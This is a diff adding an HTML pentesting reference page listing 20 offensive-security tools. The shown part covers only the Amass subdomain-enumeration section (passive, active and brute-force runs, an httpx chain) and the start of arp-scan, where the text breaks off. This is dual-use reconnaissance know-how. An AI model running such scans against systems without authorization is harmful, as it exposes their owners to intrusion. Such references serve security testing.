@@ -1,0 +1,2669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Master Tools Collection — Part 1 | cyberfox.in</title>
+<style>
+:root {
+  --bg: #0a0d0f;
+  --bg-elev: #10151a;
+  --bg-card: #131a1f;
+  --bg-card-hover: #172026;
+  --border: #1f2b32;
+  --border-soft: #182228;
+  --text: #c9d6dc;
+  --text-dim: #7d8f98;
+  --text-faint: #566670;
+  --green: #35e08a;
+  --cyan: #4fd6e8;
+  --amber: #f0b750;
+  --orange: #f0864f;
+  --red: #ef6a6a;
+  --mono: 'JetBrains Mono', 'Fira Code', ui-monospace, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  line-height: 1.65;
+  font-size: 15.5px;
+  -webkit-font-smoothing: antialiased;
+}
+
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  background:
+    radial-gradient(ellipse 900px 500px at 15% -5%, rgba(53,224,138,0.06), transparent 60%),
+    radial-gradient(ellipse 700px 500px at 90% 10%, rgba(79,214,232,0.05), transparent 60%);
+  pointer-events: none;
+  z-index: 0;
+}
+
+::selection { background: rgba(53,224,138,0.25); color: #fff; }
+
+code { font-family: var(--mono); }
+
+/* ---------- Layout ---------- */
+.app {
+  display: grid;
+  grid-template-columns: 268px 1fr;
+  min-height: 100vh;
+  position: relative;
+  z-index: 1;
+}
+
+/* ---------- Sidebar ---------- */
+.sidebar {
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+  border-right: 1px solid var(--border-soft);
+  background: var(--bg-elev);
+  padding: 22px 14px 40px;
+}
+.sidebar::-webkit-scrollbar { width: 6px; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+.brand {
+  padding: 4px 10px 20px;
+  border-bottom: 1px solid var(--border-soft);
+  margin-bottom: 16px;
+}
+.brand-mark {
+  font-family: var(--mono);
+  font-size: 11px;
+  letter-spacing: 0.14em;
+  color: var(--green);
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.brand-mark::before { content: "●"; font-size: 8px; }
+.brand-title {
+  font-size: 17px;
+  font-weight: 700;
+  margin-top: 6px;
+  color: #fff;
+  letter-spacing: -0.01em;
+}
+.brand-sub {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--text-faint);
+  margin-top: 4px;
+}
+
+.nav-search {
+  width: 100%;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 8px 10px;
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12.5px;
+  margin-bottom: 14px;
+  outline: none;
+}
+.nav-search:focus { border-color: var(--green); }
+.nav-search::placeholder { color: var(--text-faint); }
+
+.nav-list { display: flex; flex-direction: column; gap: 1px; }
+.nav-link {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 10px;
+  border-radius: 6px;
+  color: var(--text-dim);
+  text-decoration: none;
+  font-size: 13px;
+  transition: background 0.15s, color 0.15s;
+  border-left: 2px solid transparent;
+}
+.nav-icon { font-size: 13px; width: 16px; text-align: center; opacity: 0.85; }
+.nav-link:hover { background: var(--bg-card); color: var(--text); }
+.nav-link.active {
+  background: rgba(53,224,138,0.08);
+  color: var(--green);
+  border-left-color: var(--green);
+}
+
+/* ---------- Main ---------- */
+.main { min-width: 0; padding: 0 0 80px; }
+
+.hero {
+  padding: 64px 56px 44px;
+  border-bottom: 1px solid var(--border-soft);
+  position: relative;
+  overflow: hidden;
+}
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--cyan);
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.hero-eyebrow .dash { width: 24px; height: 1px; background: var(--cyan); opacity: 0.5; }
+.hero h1 {
+  font-size: 44px;
+  line-height: 1.08;
+  margin-top: 18px;
+  color: #fff;
+  font-weight: 800;
+  letter-spacing: -0.02em;
+  max-width: 800px;
+}
+.hero h1 .accent { color: var(--green); }
+.hero-desc {
+  margin-top: 18px;
+  max-width: 640px;
+  color: var(--text-dim);
+  font-size: 15.5px;
+}
+.hero-stats {
+  display: flex;
+  gap: 32px;
+  margin-top: 34px;
+  flex-wrap: wrap;
+}
+.stat { font-family: var(--mono); }
+.stat-num { font-size: 26px; font-weight: 700; color: var(--amber); }
+.stat-label { font-size: 11px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.08em; margin-top: 2px; }
+
+.legend {
+  margin-top: 34px;
+  display: flex;
+  gap: 18px;
+  flex-wrap: wrap;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text-faint);
+}
+.legend span { display: flex; align-items: center; gap: 6px; }
+.legend .dot { width: 8px; height: 8px; border-radius: 2px; }
+.dot.why { background: var(--cyan); }
+.dot.look { background: var(--amber); }
+.dot.next { background: var(--green); }
+.dot.fail { background: var(--red); }
+.dot.fc { background: var(--orange); }
+
+/* ---------- TOC grid ---------- */
+.toc-wrap { padding: 40px 56px; border-bottom: 1px solid var(--border-soft); }
+.toc-heading {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text-faint);
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  margin-bottom: 16px;
+}
+.toc-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: 10px;
+}
+.toc-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 14px 14px;
+  text-decoration: none;
+  color: var(--text);
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  transition: transform 0.15s, border-color 0.15s, background 0.15s;
+}
+.toc-card:hover {
+  border-color: var(--green);
+  background: var(--bg-card-hover);
+  transform: translateY(-2px);
+}
+.toc-icon { font-size: 20px; }
+.toc-name { font-weight: 600; font-size: 14px; color: #fff; margin-top: 4px; }
+.toc-cat { font-family: var(--mono); font-size: 10.5px; color: var(--text-faint); }
+
+/* ---------- Sections ---------- */
+.tool-section {
+  padding: 56px 56px 20px;
+  border-bottom: 1px solid var(--border-soft);
+  scroll-margin-top: 20px;
+}
+
+.section-header { display: flex; align-items: flex-start; gap: 18px; }
+.section-number {
+  font-family: var(--mono);
+  font-size: 13px;
+  color: var(--text-faint);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 4px 8px;
+  margin-top: 4px;
+}
+.section-title-wrap { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+.section-icon { font-size: 26px; }
+.section-title-wrap h2 { font-size: 28px; color: #fff; font-weight: 800; letter-spacing: -0.01em; }
+.section-cat {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--green);
+  border: 1px solid rgba(53,224,138,0.3);
+  background: rgba(53,224,138,0.06);
+  padding: 3px 9px;
+  border-radius: 20px;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+}
+
+.section-tagline {
+  margin-top: 14px;
+  font-size: 16.5px;
+  color: var(--cyan);
+  font-weight: 500;
+  max-width: 780px;
+}
+.section-overview {
+  margin-top: 12px;
+  color: var(--text-dim);
+  max-width: 800px;
+}
+
+.factcheck {
+  margin-top: 26px;
+  border: 1px solid rgba(240,134,79,0.35);
+  background: rgba(240,134,79,0.05);
+  border-radius: 10px;
+  padding: 18px 20px;
+  max-width: 840px;
+}
+.factcheck-head {
+  font-family: var(--mono);
+  font-size: 12.5px;
+  color: var(--orange);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 10px;
+}
+.factcheck ul { padding-left: 20px; display: flex; flex-direction: column; gap: 8px; }
+.factcheck li { color: var(--text); font-size: 14px; }
+.factcheck li b { color: var(--amber); }
+
+.subhead {
+  margin-top: 34px;
+  margin-bottom: 16px;
+  font-size: 15px;
+  color: #fff;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.subhead-mark { color: var(--green); font-size: 12px; }
+.adv-subhead .subhead-mark { color: var(--amber); }
+
+.cmd-grid { display: flex; flex-direction: column; gap: 14px; }
+
+.cmd-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  max-width: 900px;
+}
+.cmd-card.adv { border-color: rgba(240,183,80,0.25); }
+
+.cmd-head {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 14px;
+  background: var(--bg-elev);
+  border-bottom: 1px solid var(--border-soft);
+}
+.cmd-title { font-size: 13px; font-weight: 600; color: var(--text); }
+.copy-btn {
+  font-family: var(--mono);
+  font-size: 10.5px;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  background: transparent;
+  border: 1px solid var(--border);
+  color: var(--text-faint);
+  border-radius: 5px;
+  padding: 4px 9px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.copy-btn:hover { border-color: var(--green); color: var(--green); }
+.copy-btn.copied { border-color: var(--green); color: var(--green); }
+
+.cmd-pre {
+  padding: 14px 16px;
+  overflow-x: auto;
+  background: #0c1013;
+  border-bottom: 1px solid var(--border-soft);
+}
+.cmd-pre code {
+  font-size: 13px;
+  color: var(--green);
+  white-space: pre;
+}
+
+.cmd-meta { padding: 12px 16px 14px; display: flex; flex-direction: column; gap: 9px; }
+.meta-row { display: flex; gap: 10px; font-size: 13.5px; align-items: flex-start; }
+.meta-row > span:last-child { color: var(--text-dim); }
+.meta-tag {
+  font-family: var(--mono);
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  padding: 2px 7px;
+  border-radius: 4px;
+  white-space: nowrap;
+  flex-shrink: 0;
+  margin-top: 1px;
+  height: fit-content;
+}
+.meta-tag.why { color: var(--cyan); background: rgba(79,214,232,0.08); }
+.meta-tag.look { color: var(--amber); background: rgba(240,183,80,0.08); }
+.meta-tag.next { color: var(--green); background: rgba(53,224,138,0.08); }
+.meta-tag.fail { color: var(--red); background: rgba(239,106,106,0.08); }
+.meta-tag.adv-tag { color: var(--orange); background: rgba(240,134,79,0.08); }
+
+.opt-table {
+  width: 100%;
+  max-width: 900px;
+  border-collapse: collapse;
+  font-size: 13.5px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+}
+.opt-table th {
+  text-align: left;
+  padding: 10px 14px;
+  background: var(--bg-elev);
+  color: var(--text-faint);
+  font-family: var(--mono);
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  border-bottom: 1px solid var(--border);
+}
+.opt-table td { padding: 9px 14px; border-bottom: 1px solid var(--border-soft); color: var(--text-dim); }
+.opt-table tr:last-child td { border-bottom: none; }
+.opt-flag code { color: var(--cyan); font-size: 12.5px; }
+
+.market-note {
+  margin-top: 26px;
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--green);
+  background: var(--bg-card);
+  border-radius: 0 10px 10px 0;
+  padding: 16px 20px;
+  max-width: 840px;
+}
+.market-head {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--green);
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  display: flex;
+  align-items: center;
+  gap: 7px;
+  margin-bottom: 8px;
+}
+.market-note p { color: var(--text-dim); font-size: 14px; }
+.market-note code { color: var(--cyan); font-size: 13px; }
+
+/* footer */
+.app-footer {
+  padding: 44px 56px 60px;
+  color: var(--text-faint);
+  font-size: 13px;
+  font-family: var(--mono);
+}
+.app-footer a { color: var(--green); text-decoration: none; }
+
+.back-top {
+  position: fixed;
+  bottom: 26px;
+  right: 26px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  width: 42px;
+  height: 42px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  text-decoration: none;
+  font-size: 16px;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.2s, border-color 0.2s;
+  z-index: 50;
+}
+.back-top.show { opacity: 1; pointer-events: auto; }
+.back-top:hover { border-color: var(--green); color: var(--green); }
+
+@media (max-width: 900px) {
+  .app { grid-template-columns: 1fr; }
+  .sidebar { position: relative; height: auto; }
+  .hero, .toc-wrap, .tool-section { padding-left: 22px; padding-right: 22px; }
+  .hero h1 { font-size: 32px; }
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <nav class="sidebar">
+    <div class="brand">
+      <div class="brand-mark">cyberfox.in</div>
+      <div class="brand-title">Master Tools<br>Collection</div>
+      <div class="brand-sub">// part 1 of N — 20 tools</div>
+    </div>
+    <input type="text" class="nav-search" id="navSearch" placeholder="filter tools…">
+    <div class="nav-list" id="navList">
+      <a href="#amass" class="nav-link" data-id="amass"><span class="nav-icon">🕸</span><span class="nav-text">Amass</span></a>
+<a href="#arp-scan" class="nav-link" data-id="arp-scan"><span class="nav-icon">📡</span><span class="nav-text">arp-scan</span></a>
+<a href="#burp" class="nav-link" data-id="burp"><span class="nav-icon">🕷</span><span class="nav-text">Burp Suite</span></a>
+<a href="#cme" class="nav-link" data-id="cme"><span class="nav-icon">🗝</span><span class="nav-text">CrackMapExec / NetExec</span></a>
+<a href="#dig" class="nav-link" data-id="dig"><span class="nav-icon">🔎</span><span class="nav-text">dig</span></a>
+<a href="#dirb" class="nav-link" data-id="dirb"><span class="nav-icon">📁</span><span class="nav-text">dirb</span></a>
+<a href="#dnsrecon" class="nav-link" data-id="dnsrecon"><span class="nav-icon">🧭</span><span class="nav-text">dnsrecon</span></a>
+<a href="#eviltwin" class="nav-link" data-id="eviltwin"><span class="nav-icon">📶</span><span class="nav-text">Evil Twin Attacks</span></a>
+<a href="#evilwinrm" class="nav-link" data-id="evilwinrm"><span class="nav-icon">🪟</span><span class="nav-text">Evil-WinRM</span></a>
+<a href="#feroxbuster" class="nav-link" data-id="feroxbuster"><span class="nav-icon">🦊</span><span class="nav-text">Feroxbuster</span></a>
+<a href="#ffuf" class="nav-link" data-id="ffuf"><span class="nav-icon">⚡</span><span class="nav-text">ffuf</span></a>
+<a href="#findomain" class="nav-link" data-id="findomain"><span class="nav-icon">🌐</span><span class="nav-text">Findomain</span></a>
+<a href="#foca" class="nav-link" data-id="foca"><span class="nav-icon">📄</span><span class="nav-text">FOCA</span></a>
+<a href="#fping" class="nav-link" data-id="fping"><span class="nav-icon">🏓</span><span class="nav-text">fping</span></a>
+<a href="#gobuster" class="nav-link" data-id="gobuster"><span class="nav-icon">🚪</span><span class="nav-text">Gobuster</span></a>
+<a href="#hydra" class="nav-link" data-id="hydra"><span class="nav-icon">🐉</span><span class="nav-text">Hydra</span></a>
+<a href="#impacket" class="nav-link" data-id="impacket"><span class="nav-icon">🎯</span><span class="nav-text">Impacket</span></a>
+<a href="#john" class="nav-link" data-id="john"><span class="nav-icon">🔨</span><span class="nav-text">John the Ripper</span></a>
+<a href="#linenum" class="nav-link" data-id="linenum"><span class="nav-icon">🐧</span><span class="nav-text">LinEnum.sh</span></a>
+<a href="#lse" class="nav-link" data-id="lse"><span class="nav-icon">🔬</span><span class="nav-text">lse.sh</span></a>
+    </div>
+  </nav>
+
+  <main class="main">
+    <header class="hero">
+      <div class="hero-eyebrow"><span class="dash"></span>PENTEST REFERENCE · DARK MODE · PART 1</div>
+      <h1>Master Tools Collection<br>for <span class="accent">Pentesting</span></h1>
+      <p class="hero-desc">
+        A single, elaborate reference covering 20 core offensive-security tools — recon, network discovery,
+        web application testing, Active Directory attacks, credential attacks, and Linux privilege escalation.
+        Every command is explained in plain language (why you run it, what to look for, what comes next, and
+        what to do if it doesn't work), every sheet has been fact-checked against current tool behavior, and
+        every section includes the command combinations efficient pentesters actually reach for on real
+        engagements in 2026 — not just the textbook basics.
+      </p>
+      <div class="hero-stats">
+        <div class="stat"><div class="stat-num">20</div><div class="stat-label">Tools covered</div></div>
+        <div class="stat"><div class="stat-num">9</div><div class="stat-label">Fact-check corrections</div></div>
+        <div class="stat"><div class="stat-num">40+</div><div class="stat-label">Real-world combos added</div></div>
+        <div class="stat"><div class="stat-num">6</div><div class="stat-label">Categories</div></div>
+      </div>
+      <div class="legend">
+        <span><i class="dot why"></i>why — the reasoning</span>
+        <span><i class="dot look"></i>look for — what a good result shows</span>
+        <span><i class="dot next"></i>next — where this leads</span>
+        <span><i class="dot fail"></i>if stuck — the fix</span>
+        <span><i class="dot fc"></i>fact-check — corrected from source</span>
+      </div>
+    </header>
+
+    <div class="toc-wrap">
+      <div class="toc-heading">Jump to a tool</div>
+      <div class="toc-grid">
+        <a href="#amass" class="toc-card">
+      <span class="toc-icon">🕸</span>
+      <span class="toc-name">Amass</span>
+      <span class="toc-cat">Recon &amp; OSINT</span>
+    </a>
+<a href="#arp-scan" class="toc-card">
+      <span class="toc-icon">📡</span>
+      <span class="toc-name">arp-scan</span>
+      <span class="toc-cat">Network Discovery</span>
+    </a>
+<a href="#burp" class="toc-card">
+      <span class="toc-icon">🕷</span>
+      <span class="toc-name">Burp Suite</span>
+      <span class="toc-cat">Web Application Testing</span>
+    </a>
+<a href="#cme" class="toc-card">
+      <span class="toc-icon">🗝</span>
+      <span class="toc-name">CrackMapExec / NetExec</span>
+      <span class="toc-cat">Active Directory</span>
+    </a>
+<a href="#dig" class="toc-card">
+      <span class="toc-icon">🔎</span>
+      <span class="toc-name">dig</span>
+      <span class="toc-cat">DNS Reconnaissance</span>
+    </a>
+<a href="#dirb" class="toc-card">
+      <span class="toc-icon">📁</span>
+      <span class="toc-name">dirb</span>
+      <span class="toc-cat">Web Content Discovery</span>
+    </a>
+<a href="#dnsrecon" class="toc-card">
+      <span class="toc-icon">🧭</span>
+      <span class="toc-name">dnsrecon</span>
+      <span class="toc-cat">DNS Reconnaissance</span>
+    </a>
+<a href="#eviltwin" class="toc-card">
+      <span class="toc-icon">📶</span>
+      <span class="toc-name">Evil Twin Attacks</span>
+      <span class="toc-cat">Wireless</span>
+    </a>
+<a href="#evilwinrm" class="toc-card">
+      <span class="toc-icon">🪟</span>
+      <span class="toc-name">Evil-WinRM</span>
+      <span class="toc-cat">Windows Remote Access</span>
+    </a>
+<a href="#feroxbuster" class="toc-card">
+      <span class="toc-icon">🦊</span>
+      <span class="toc-name">Feroxbuster</span>
+      <span class="toc-cat">Web Content Discovery</span>
+    </a>
+<a href="#ffuf" class="toc-card">
+      <span class="toc-icon">⚡</span>
+      <span class="toc-name">ffuf</span>
+      <span class="toc-cat">Web Fuzzing</span>
+    </a>
+<a href="#findomain" class="toc-card">
+      <span class="toc-icon">🌐</span>
+      <span class="toc-name">Findomain</span>
+      <span class="toc-cat">Recon &amp; OSINT</span>
+    </a>
+<a href="#foca" class="toc-card">
+      <span class="toc-icon">📄</span>
+      <span class="toc-name">FOCA</span>
+      <span class="toc-cat">OSINT &amp; Metadata</span>
+    </a>
+<a href="#fping" class="toc-card">
+      <span class="toc-icon">🏓</span>
+      <span class="toc-name">fping</span>
+      <span class="toc-cat">Network Discovery</span>
+    </a>
+<a href="#gobuster" class="toc-card">
+      <span class="toc-icon">🚪</span>
+      <span class="toc-name">Gobuster</span>
+      <span class="toc-cat">Web Content Discovery</span>
+    </a>
+<a href="#hydra" class="toc-card">
+      <span class="toc-icon">🐉</span>
+      <span class="toc-name">Hydra</span>
+      <span class="toc-cat">Credential Attacks</span>
+    </a>
+<a href="#impacket" class="toc-card">
+      <span class="toc-icon">🎯</span>
+      <span class="toc-name">Impacket</span>
+      <span class="toc-cat">Active Directory</span>
+    </a>
+<a href="#john" class="toc-card">
+      <span class="toc-icon">🔨</span>
+      <span class="toc-name">John the Ripper</span>
+      <span class="toc-cat">Password Cracking</span>
+    </a>
+<a href="#linenum" class="toc-card">
+      <span class="toc-icon">🐧</span>
+      <span class="toc-name">LinEnum.sh</span>
+      <span class="toc-cat">Linux Privilege Escalation</span>
+    </a>
+<a href="#lse" class="toc-card">
+      <span class="toc-icon">🔬</span>
+      <span class="toc-name">lse.sh</span>
+      <span class="toc-cat">Linux Privilege Escalation</span>
+    </a>
+      </div>
+    </div>
+
+    
+    <section class="tool-section" id="amass">
+      <div class="section-header">
+        <div class="section-number">01</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🕸</span>
+          <h2>Amass</h2>
+          <span class="section-cat">Recon &amp; OSINT</span>
+        </div>
+      </div>
+      <p class="section-tagline">OWASP's attack-surface mapper — passive intel, active DNS, brute force, and graph visualization in one framework.</p>
+      <p class="section-overview">Amass isn't just a subdomain lister — it builds a graph database of every asset, relationship, and
+ data source it touches (ASNs, netblocks, certs, WHOIS, DNS records). That graph is what separates it from a
+ simple wordlist tool: you can query it later to answer questions like "which subdomains share this ASN" without
+ re-scanning. It's maintained by the OWASP Amass project and is still one of the two or three tools (alongside
+ subfinder and findomain) that professional bug-bounty hunters and red teamers reach for first during external recon.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>The subcommand list (<code>enum</code>, <code>intel</code>, <code>viz</code>, <code>track</code>, <code>db</code>) is accurate for Amass v3/v4.</li>
+<li><code>-passive</code> and <code>-active</code> are correctly described, but they're mutually exclusive in practice: <code>-passive</code> skips DNS resolution entirely (OSINT sources only, so results include some dead/unclaimed subdomains), while regular <code>enum</code> (no flag) already does active DNS resolution — <code>-active</code> on top of that additionally enables zone transfer attempts and reverse DNS sweeps, which is noisier and more likely to touch the target's infrastructure directly.</li>
+<li>As of Amass v4, the legacy <code>-config config.ini</code> format was replaced by a YAML config (<code>~/.config/amass/config.yaml</code>) for API keys and data sources — the old <code>.ini</code> syntax shown in most older cheatsheets no longer works out of the box.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Passive enumeration (OSINT only, zero direct contact)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>amass enum -passive -d example.com -o passive_subdomains.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Pulls subdomains from certificate transparency logs, WHOIS, search engines, and other third-party sources without ever sending a packet to the target. Ideal for the very first recon pass before you've signed a scope-authorized testing window.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A list of hostnames — some may be stale (pointing to nothing, or to infrastructure the target no longer owns).</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Feed the list into <code>httpx</code> or <code>dnsx</code> to filter for subdomains that actually resolve and respond over HTTP before spending time on them.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Domain has little public footprint, or your API keys aren't configured — passive sources are only as good as the keys you feed them.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Active enumeration with brute-forcing</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>amass enum -active -brute -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Combines passive sources with direct DNS brute-forcing to catch subdomains that were never indexed publicly (internal-only names, staging environments someone forgot to keep private).</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A denser subdomain list, including ones only discoverable by guessing.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Sort by whether each host resolves to a public or RFC1918 (internal) IP — internal-only hits are often the most interesting, since they leak internal naming conventions.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Wordlist is too small, or the org uses random/hashed subdomain names that brute force can't guess.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Graph visualization</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>amass viz -d3 -o results.html -d example.com</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Turns the internal graph database into an interactive D3.js diagram, which is genuinely useful for client reports — it's the single visual most clients understand instantly.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>An HTML file with a force-directed graph of domains, IPs, and ASNs.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Screenshot it straight into your recon report; it communicates scope better than a wall of text ever will.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No data was collected in a prior <code>enum</code> run for that domain — <code>viz</code> reads from the existing Amass database, it doesn't scan on its own.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Using API keys for deeper coverage</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>amass enum -d example.com -config ~/.config/amass/config.yaml</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Free passive sources (crt.sh, RapidDNS) only go so far. Adding keys for Shodan, VirusTotal, SecurityTrails, and Censys roughly doubles typical subdomain yield on a real engagement.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A noticeably larger subdomain list than the keyless run.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Keep a personal, versioned <code>config.yaml</code> template on your VPS so every new client engagement starts fully keyed.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Free-tier API rate limits exhausted — most of these services cap unauthenticated or free-tier daily lookups.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-d &lt;domain&gt;</code></td><td>Target domain to enumerate.</td></tr>
+<tr><td class="opt-flag"><code>-passive</code></td><td>OSINT-only, no DNS resolution — safest, quietest option.</td></tr>
+<tr><td class="opt-flag"><code>-active</code></td><td>Adds zone-transfer attempts and reverse DNS sweeps on top of normal resolution.</td></tr>
+<tr><td class="opt-flag"><code>-brute</code></td><td>Enables dictionary-based subdomain brute forcing.</td></tr>
+<tr><td class="opt-flag"><code>-w &lt;wordlist&gt;</code></td><td>Wordlist for brute forcing.</td></tr>
+<tr><td class="opt-flag"><code>-o &lt;file&gt;</code></td><td>Save plain-text results.</td></tr>
+<tr><td class="opt-flag"><code>-json &lt;file&gt;</code></td><td>Save results as JSON for scripting.</td></tr>
+<tr><td class="opt-flag"><code>-ip</code></td><td>Include resolved IPs in output.</td></tr>
+<tr><td class="opt-flag"><code>-config &lt;file&gt;</code></td><td>YAML config with API keys and data-source settings (v4).</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Chain into httpx for a live-host shortlist (typical bug-bounty opener)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>amass enum -passive -d example.com -o subs.txt &amp;&amp; cat subs.txt | httpx -silent -title -status-code -tech-detect -o live.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>This is the real-world pattern almost every full-time bounty hunter runs first: passive recon feeds straight into httpx, which resolves each host, grabs the page title, HTTP status, and fingerprints the tech stack in one pass. You go from raw subdomain names to a triaged list of 'what's actually alive and worth looking at' in under a minute.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Diff scans over time to catch new attack surface</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>amass enum -passive -d example.com -o today.txt
+comm -13 &lt;(sort yesterday.txt) &lt;(sort today.txt) &gt; new_hosts.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Amass's own <code>track</code> subcommand does this natively, but most working pentesters just diff two dated output files with <code>comm</code> — simpler, scriptable, and easy to drop into a cron job for continuous recon on a retainer client.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>On a real engagement in 2026, Amass is rarely used alone — it's one leg of a recon stack alongside <code>subfinder</code> (faster, simpler passive-only) and <code>dnsx</code>/<code>httpx</code> (resolution and liveness). Efficient testers run Amass passively first for coverage, then reserve <code>-active -brute</code> for a specific subdomain that already looks interesting, since active mode is slow and noisy against a whole enterprise domain.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="arp-scan">
+      <div class="section-header">
+        <div class="section-number">02</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">📡</span>
+          <h2>arp-scan</h2>
+          <span class="section-cat">Network Discovery</span>
+        </div>
+      </div>
+      <p class="section-tagline">Layer-2 host discovery that finds devices even when they're hiding from ICMP and TCP probes.</p>
+      <p class="section-overview">arp-scan works below IP entirely — it sends raw ARP requests and reads the replies, so it discovers
